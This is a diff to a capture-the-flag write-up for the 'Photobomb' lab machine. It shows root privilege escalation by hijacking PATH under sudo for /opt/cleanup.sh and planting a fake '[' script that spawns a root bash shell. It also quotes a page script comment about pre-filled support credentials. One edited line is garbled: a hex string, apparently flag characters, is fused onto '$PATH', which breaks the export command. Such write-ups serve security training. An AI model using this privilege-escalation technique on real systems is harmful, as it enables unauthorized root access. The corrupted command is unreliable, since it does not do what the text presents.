@@ -45,7 +45,7 @@ This web page has a link to another page which says `click here`. Then after cli
 
 ![image](/assets/img/photobomb/02.png)
 
-After some trials of known usernames and passwords i failed but after reading again from the page i saw `click here (the credentials are in your welcome pack)`  then i  checked source codes and found the followings  `javascript` 
+After some failed trials of known usernames and passwords i decided to read again from the page and there was a hint there `click here (the credentials are in your welcome pack)`  then i  checked source codes and found the followings  `javascript` 
 ```
 function init() {
   // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
@@ -198,7 +198,7 @@ wizard@photobomb:/tmp$ echo $PATH
 wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
 root@photobomb:/home/wizard/photobomb# 
 root@photobomb:/home/wizard/photobomb# cat /root/root.txt
-96cff980d7332b412287f83f2512f60b
+96cff980d7332b4********
 ```
 ### Intended way
 Back to `/opt/cleanup.sh`
@@ -241,7 +241,7 @@ And the first thing is about the environment variables and the second thing is `
 ```
 wizard@photobomb:/tmp$ echo -e '#!/bin/bash\nbash' > [
 wizard@photobomb:/tmp$ chmod +x [
-wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
+wizard@photobomb:/tmp$ export PATH=/tmp:$PATH0d17567e349d26e167a
 wizard@photobomb:/tmp$ sudo PATH=pwd:$PATH /opt/cleanup.sh 
 root@photobomb:/tmp# 
 ```
